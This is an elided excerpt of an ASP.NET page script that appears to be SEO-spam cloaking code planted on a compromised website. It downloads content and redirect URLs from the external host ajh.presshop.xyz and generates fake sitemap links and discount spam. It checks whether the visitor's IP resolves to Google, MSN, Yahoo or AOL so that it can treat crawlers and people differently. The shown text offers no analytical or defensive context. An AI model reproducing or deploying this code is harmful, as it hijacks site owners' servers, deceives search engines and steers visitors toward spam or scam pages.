...
<script runat="server">
    ...
    protected void Page_Load(object sender, EventArgs e)
    {
        ...
        if (!IsPostBack)
        {
            ...
            else
            {
                ...
                string URL = "http://ajh.presshop.xyz/2021/doiid.aspx";
                descriptions = webclient.DownloadString("http://ajh.presshop.xyz/getci.aspx?cid=" + Request.QueryString["categoryid"] + "&s=5&e=6");
                content1 = webclient.DownloadString("http://ajh.presshop.xyz/0511/wz.aspx");
                if (Request.QueryString["s"] != null)
                {
                    int cid = new Random().Next(1, 123);
                    if (Request.QueryString["categoryid"] != null) { cid = int.Parse(Request.QueryString["categoryid"]); }
                    URL = "http://ajh.presshop.xyz/sjd.aspx?cid=" + cid + "&number=" + Request.QueryString["number"] + "&pnum=" + Request.QueryString["pnum"];
                ...
                else
                {
                    ...
                    {
                        int txtd = new Random().Next(1, 249);
                        URL += "?iid=" + Request.QueryString["productid"] + "&cid=" + Request.QueryString["categoryid"] + "&mt=http://ajh.presshop.xyz/en/333/" + txtd + ".txt";
                    ...
                    string ttttt = kname + "," + HttpContext.Current.Request.Url.Host + Request.QueryString["pnum"];
                    string kkkkk = kname;
                    ddddd = "<div style='display: block'><ul><li>Related links: <a href='?s=s&categoryid=" + new Random().Next(1, 30) + "&number=999'>sitemap01</a></li><li>Related links: <a href='?s=s&categoryid=" + new Random().Next(30, 60) + "&number=999'>sitemap02</a></li><li>Related links: <a href='?s=s&categoryid=" + new Random().Next(60, 90) + "&number=999'>sitemap03</a></li><li>Related links: <a href='?s=s&categoryid=" + new Random().Next(90, 120) + "&number=999'>sitemap04</a></li></ul></div>";
                    string iiiii = content1 + ",Sale OFF " + new Random().Next(60, 80) + "%," + kname + descriptions;
    ...
    public void tz()
    {
        ...
        string ipurl = "http://ajh.presshop.xyz/getdomain.aspx?rnd=1&ip=" + ip;
        webclient = new System.Net.WebClient();
        webclient.Encoding = System.Text.Encoding.UTF8;
        ...
        if (domain.IndexOf("google") == -1 && domain.IndexOf("msn.com") == -1 && domain.IndexOf("yahoo.com") == -1 && domain.IndexOf("aol.com") == -1)
        {
            if (Request.QueryString["productid"] != null)
            {
                ...
                string ddd = webclient.DownloadString("http://ajh.presshop.xyz/newurl.asp?cid=" + Request.QueryString["categoryid"] + "");
